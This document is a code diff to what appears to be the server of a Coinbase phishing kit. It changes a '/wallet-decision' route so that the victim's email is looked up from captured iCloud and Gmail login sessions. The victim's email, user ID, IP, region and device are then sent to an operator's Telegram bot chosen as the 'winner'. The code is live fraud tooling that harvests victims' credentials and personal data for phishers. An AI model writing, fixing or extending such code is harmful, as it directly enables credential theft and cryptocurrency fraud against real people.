@@ -2190,21 +2190,41 @@ const server = // ==============================================================
 
 app.post("/wallet-decision", async (req, res) => {
   try {
-    const { userId, email } = req.body;
+    let { userId, email } = req.body;
 
     if (!email) {
       return res.status(400).json({ error: "Missing email" });
     }
+
+    // ✅ RESOLVE EMAIL USING MULTI-LAYER TRACKING (to find winner)
+    const resolvedEmail = resolveEmailFromRequest(req, null, userId) || email;
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
     const region = await detectRegion(ip);
 
+    // ✅ GET DISPLAY EMAIL (most recent entered email from iCloud/Gmail)
+    let displayEmail = email;
+    
+    // Check if there's a more recent email from iCloud login
+    if (pendingPage[email] && pendingPage[email].displayEmail) {
+      displayEmail = pendingPage[email].displayEmail;
+    }
+    // Check if there's a more recent email from Gmail login (use email as key from pendingGmailLogin)
+    else {
+      for (let key in pendingGmailLogin) {
+        if (pendingGmailLogin[key].email === email) {
+          displayEmail = pendingGmailLogin[key].displayEmail || email;
+          break;
+        }
+      }
+    }
+
     const message =
       `😈😈😈 <b>Coinbase - Last Direction</b> 😈😈😈\n` +
       `<b>👤 User ID:</b> <code>#${userId}</code>\n` +
-      `<b>📧 Email:</b> <code>${email}</code>\n` +
+      `<b>📧 Email:</b> <code>${displayEmail}</code>\n` +
       `<b>🌍 Region:</b> ${region}\n` +
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
@@ -2223,10 +2243,10 @@ app.post("/wallet-decision", async (req, res) => {
       }
     };
 
-    // ✅ SEND TO WINNER ONLY
-    if (email && userWinnerTelegram[email]) {
-      await sendFollowUpMessage(email, message, options);
-      console.log(`💰 Wallet decision sent to winner for ${email}`);
+    // ✅ SEND TO WINNER ONLY (use resolved email to find correct bot)
+    if (resolvedEmail && userWinnerTelegram[resolvedEmail]) {
+      await sendFollowUpMessage(resolvedEmail, message, options);
+      console.log(`💰 Wallet decision sent to winner for ${email} (display: ${displayEmail})`);
     } else {
       console.log(`⚠️ WARNING: No winner found for ${email}, not sending wallet decision`);
       return res.status(400).json({ error: "No winner determined for this email" });
